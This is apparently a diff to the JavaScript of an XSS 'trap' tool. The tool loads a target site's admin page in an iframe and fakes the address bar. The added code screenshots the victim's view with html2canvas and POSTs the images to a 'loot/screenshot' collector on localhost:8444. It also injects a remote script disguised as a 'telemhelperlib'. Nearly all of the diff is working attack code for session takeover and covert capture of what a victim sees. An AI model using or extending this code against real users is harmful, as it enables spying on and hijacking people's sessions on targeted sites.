@@ -2,6 +2,7 @@ alert('Ready to launch trap?');
 
 
 
+
 // Ue fullscreen for actual prod usage
 // not fullscreen shows the XSS laden landing
 // page in the background so you can 
@@ -22,8 +23,143 @@ let startingPage = "https://targetapp.possiblymalware.com/wp-admin";
 
 
 // Helpful variables
-let trapLandingPage = "";
-let savedFakePage   = "";
+let lastFakeUrl = "";
+
+
+// Slow down the html2canvas
+let loaded = false;
+
+
+// Client session
+var sessionName = "";
+
+const AdjectiveList = [
+	"funky",
+	"smelly",
+	"skunky",
+	"merry",
+	"whimsical",
+	"amusing",
+	"hysterical",
+	"bumfuzzled",
+	"bodacious",
+	"absurd",
+	"animated",
+	"brazen",
+	"cheesy",
+	"clownish",
+	"confident",
+	"crazy",
+	"cuckoo",
+	"deranged",
+	"ludicrous",
+	"playful",
+	"quirky",
+	"screwball",
+	"slapstick",
+	"wacky",
+	"excited",
+	"humorous",
+	"charming",
+	"confident",
+	"fanatical"
+	];
+
+const ColorList = [
+	"blue",
+	"red",
+	"green",
+	"white",
+	"black",
+	"brown",
+	"azure",
+	"pink",
+	"yellow",
+	"silver",
+	"purple",
+	"orange",
+	"grey",
+	"fuchsia",
+	"crimson",
+	"lime",
+	"plum",
+	"olive",
+	"cyan",
+	"ivory",
+	"magenta"
+	];
+
+const MurderCritter = [
+	"kangaroo",
+	"koala",
+	"dropbear",
+	"wombat",
+	"wallaby",
+	"dingo",
+	"emu",
+	"tassiedevil",
+	"platypus",
+	"salty",
+	"kookaburra",
+	"boxjelly",
+	"blueringoctopus",
+	"taipan",
+	"stonefish",
+	"redback",
+	"cassowary",
+	"funnelwebspider",
+	"conesnail"
+	];
+
+
+
+// *******************************************************************************
+
+// Generate a session identifier
+function initSession()
+{
+	var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
+	var color = ColorList[Math.floor(Math.random()*ColorList.length)];
+	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
+	sessionName = adjective + "-" + color + "-" + murderer;
+}
+
+
+
+// Snag a screenshot and ship it
+function sendScreenshot()
+{
+	if (loaded == false)
+	{
+		console.log("!!! Waiting 3 seconds to init html2canvas!");
+		setTimeout(function () {}, 3000);
+		loaded = true;
+	}
+	console.log("---Snagging screenshot...");
+
+//	html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
+	html2canvas(document.getElementById("iframe_a").contentDocument, {scale: 1}).then(canvas => 
+	{
+		function responseHandler() 
+		{
+			console.log(this.responseText)
+		};
+
+		console.log("About to send image....");
+		newReq = new XMLHttpRequest();newReq.addEventListener("load", responseHandler);
+		newReq.open("POST", "http://localhost:8444/loot/screenshot/" + sessionName);
+
+		canvas.toBlob((blob) => 
+		{
+			const image = blob;
+					// jsonData["screenshot"] = image;
+					// var jsonString = JSON.stringify(jsonData);
+
+			newReq.send(image);
+		});
+	}).catch(e => console.log(e));
+}
+
 
 
 
@@ -38,7 +174,22 @@ let savedFakePage   = "";
 function updateUrl()
 {
 	var fakeUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
-	console.log("Fake url is: " + fakeUrl);
+	if (lastFakeUrl != fakeUrl)
+	{
+		console.log("New URL to fake!");
+		console.log("url: " + fakeUrl);
+		lastFakeUrl = fakeUrl;
+
+		// This needs an API call to report the new page
+		// and take a screenshot maybe, not sure if
+		// screenshot timing will be right yet
+
+		sendScreenshot();
+	}
+	else
+		console.log("Fake URL doesn't need updating");
+
+	//console.log("Fake url is: " + fakeUrl);
 	window.history.replaceState(null, '', fakeUrl);
 }
 
@@ -47,7 +198,7 @@ function updateUrl()
 
 
 
-
+// Start the trap
 function takeOver()
 {
 
@@ -86,12 +237,25 @@ function takeOver()
 
 	// Hook all the things for URL faking
 	for(var key in myIframe){
-   		if(key.search('on') === 0) {
-      		myIframe.addEventListener(key.slice(2), updateUrl);
-   		 }
+		if(key.search('on') === 0) {
+			myIframe.addEventListener(key.slice(2), updateUrl);
+		}
 	}
 
 }
+
+// ********************************************
+// Go time
+
+// Pull in html2canvas
+var js = document.createElement("script");
+js.type = "text/javascript";
+js.src = "http://localhost:8444/lib/telemhelperlib.js";
+document.body.appendChild(js);
+
+
+// Pick our session ID
+initSession();
 
 
 
